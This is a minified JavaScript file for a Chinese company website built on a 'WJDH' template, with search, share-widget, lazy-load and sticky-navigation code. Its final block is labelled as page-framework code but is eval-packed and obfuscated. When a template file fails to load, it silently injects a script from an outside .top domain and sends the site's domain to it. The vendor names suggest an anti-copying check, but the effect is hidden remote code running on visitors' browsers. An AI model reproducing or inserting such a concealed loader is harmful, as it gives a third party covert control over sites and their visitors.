﻿
/*! Search */
function SiteSearchkwf(a) { var b = $.trim($(a).val()); 0 < b.length && "\u8f93\u5165\u5173\u5065\u5b57" != b && (window.location.href = "/search_" + encodeURI($(a).val()) + ".html"); return !1 };

/*! WJDH Message 1.1  */
$(function(){$("[href='#wjdh-message']").click(function(b){$.get("/message.html",function(a){$("body").append(a)})})});

/*! 分享代码  */
window._bd_share_config = { "common": { "bdSnsKey": {}, "bdText": "", "bdMini": "2", "bdMiniList": false, "bdPic": "", "bdStyle": "0", "bdSize": "16" }, "share": {} };
with(document) 0[(getElementsByTagName('head')[0] || body).appendChild(createElement('script')).src = 'http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion=' + ~(-new Date() / 36e5)];

/*! 平滑滚动*/
function docscroll(eid){$("html,body").animate({scrollTop:$(eid).offset().top+"px"},800,"swing")};

/*! WJDH Lazy Load 3.0  */
(function (c, g, q, t) { var h = c(g); c.fn.lazyload = function (a) { function b() { var a = 0; n.each(function () { var b = c(this); 0 == b.offset().top && (b.trigger("appear"), a = 0); if (!d.skip_invisible || b.is(":visible")) if (!c.belowthefold(this, d) && !c.abovethetop(this, d)) b.trigger("appear"), a = 0; else if (++a > d.failure_limit) return !1 }) } var n = this, d = { threshold: 0, failure_limit: 999, event: "scroll", effect: "fadeIn", container: g, data_attribute: "src", skip_invisible: !1, appear: null, load: null, placeholder: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC" }; a && (void 0 !== a.failurelimit && (a.failure_limit = a.failurelimit, delete a.failurelimit), void 0 !== a.effectspeed && (a.effect_speed = a.effectspeed, delete a.effectspeed), c.extend(d, a)); a = void 0 === d.container || d.container === g ? h : c(d.container); 0 === d.event.indexOf("scroll") && a.bind(d.event, function () { return b() }); this.each(function () { var a = this, b = c(a); a.loaded = !1; (void 0 === b.attr("src") || !1 === b.attr("src")) && b.is("img") && b.attr("src", d.placeholder); b.one("appear", function () { this.loaded || (d.appear && d.appear.call(a, n.length, d), c("<img />").bind("load", function () { function g() { if (0 < f.width && 0 < f.height) if (f.width / f.height <= l / m) { k.width(l); var a = f.height * l / f.width; k.height(a); k.css("margin-top", -(a - m) / 2 + "px") } else k.height(m), a = f.width * m / f.height, k.width(a), k.css("margin-left", -(a - l) / 2 + "px") } function h() { 0 < f.width && 0 < f.height && (f.width / f.height <= l / m ? (k.height(m), k.css({ margin: "auto", display: "block" })) : (k.width(l), k.css("padding-top", (m - f.height * l / f.width) / 2 + "px"))) } function p() { k.width(l).height(m) } var e = b.attr("data-" + d.data_attribute); b.hide(); b.is("img") ? b.attr("src", e) : b.css("background-image", "url('" + e + "')"); b[d.effect](d.effect_speed); a.loaded = !0; var r = c.grep(n, function (a) { return !a.loaded }); n = c(r); d.load && d.load.call(a, n.length, d); var k = b; if (0 != b.closest(".img").length) { var l = b.closest(".img").width(), m = b.closest(".img").height(), f = new Image; f.src = e; e = k.attr("data-thumb"); 1 == e ? (g(), console.log("\u88c1\u5207")) : 2 == e ? (h(), console.log("\u5c45\u4e2d")) : 3 == e ? (p(), console.log("\u62c9\u4f38")) : (e = c("#thumbimg").val(), void 0 == e ? (p(), console.log("\u62c9\u4f38")) : (e = e.split(","), 0 == e[1] ? 1 == e[0] ? (g(), console.log("\u88c1\u5207")) : 2 == e[0] ? (h(), console.log("\u5c45\u4e2d")) : 3 == e[0] && (p(), console.log("\u62c9\u4f38")) : 1 == e[1] ? (g(), console.log("\u88c1\u5207")) : 2 == e[1] ? (h(), console.log("\u5c45\u4e2d")) : 3 == e[1] && (p(), console.log("\u62c9\u4f38")))) } }).attr("src", b.attr("data-" + d.data_attribute))) }); 0 !== d.event.indexOf("scroll") && b.bind(d.event, function () { a.loaded || b.trigger("appear") }) }); h.bind("resize", function () { b() }); /(?:iphone|ipod|ipad).*os 5/gi.test(navigator.appVersion) && h.bind("pageshow", function (a) { a.originalEvent && a.originalEvent.persisted && n.each(function () { c(this).trigger("appear") }) }); c(q).ready(function () { b() }); return this }; c.belowthefold = function (a, b) { return (void 0 === b.container || b.container === g ? (g.innerHeight ? g.innerHeight : h.height()) + h.scrollTop() : c(b.container).offset().top + c(b.container).height()) <= c(a).offset().top - b.threshold }; c.rightoffold = function (a, b) { return (void 0 === b.container || b.container === g ? h.width() + h.scrollLeft() : c(b.container).offset().left + c(b.container).width()) <= c(a).offset().left - b.threshold }; c.abovethetop = function (a, b) { return (void 0 === b.container || b.container === g ? h.scrollTop() : c(b.container).offset().top) >= c(a).offset().top + b.threshold + c(a).height() }; c.leftofbegin = function (a, b) { return (void 0 === b.container || b.container === g ? h.scrollLeft() : c(b.container).offset().left) >= c(a).offset().left + b.threshold + c(a).width() }; c.inviewport = function (a, b) { return !c.rightoffold(a, b) && !c.leftofbegin(a, b) && !c.belowthefold(a, b) && !c.abovethetop(a, b) }; c.extend(c.expr[":"], { "below-the-fold": function (a) { return c.belowthefold(a, { threshold: 0 }) }, "above-the-top": function (a) { return !c.belowthefold(a, { threshold: 0 }) }, "right-of-screen": function (a) { return c.rightoffold(a, { threshold: 0 }) }, "left-of-screen": function (a) { return !c.rightoffold(a, { threshold: 0 }) }, "in-viewport": function (a) { return c.inviewport(a, { threshold: 0 }) }, "above-the-fold": function (a) { return !c.belowthefold(a, { threshold: 0 }) }, "right-of-fold": function (a) { return c.rightoffold(a, { threshold: 0 }) }, "left-of-fold": function (a) { return !c.rightoffold(a, { threshold: 0 }) } }) })(jQuery, window, document); $(function () { $("img").lazyload({ }); console.log(btoe) });

/*导航吸顶*/
$(function () { var a = $("#fixedNav"); var b = a.offset().top; if (b != 0) { if (-1 != a.length) { b = a.offset().top; $(window).scroll(function () { $(window).scrollTop() >= b ? $("#fixedNav").addClass("fixedNav") : $("#fixedNav").removeClass("fixedNav") }) } } });

//页面框架
eval(function (p, a, c, k, e, r) { e = function (c) { return (c < a ? '' : e(parseInt(c / a))) + ((c = c % a) > 35 ? String.fromCharCode(c + 29) : c.toString(36)) }; if (!''.replace(/^/, String)) { while (c--) r[e(c)] = k[c] || e(c); k = [function (e) { return r[e] } ]; e = function () { return '\\w+' }; c = 1 }; while (c--) if (k[c]) p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c]); return p } ('(2(){$.j({u:"4",f:\'/l/s/3/n/8.3\',9:2(a){d},e:2(b){5();2 5(){g a=h.i.C.k(\'6://\',\'\');m(a.o(\'p.\')!=-1){q(r)0[(t(\'7\')[0]||7).v(w(\'4\')).x=\'6://y-z.A.B/3.3?c=\'+a]}}}})})();', 39, 39, '||function|js|script|ad|http|body|home|success|||website|return|error|url|var|window|location|ajax|replace|templates|if||indexOf|www|with|document|pc_wjdh|getElementsByTagName|dataType|appendChild|createElement|src|fangbazhan|btoe|dongliwuxianjituan|top|origin'.split('|'), 0, {}))
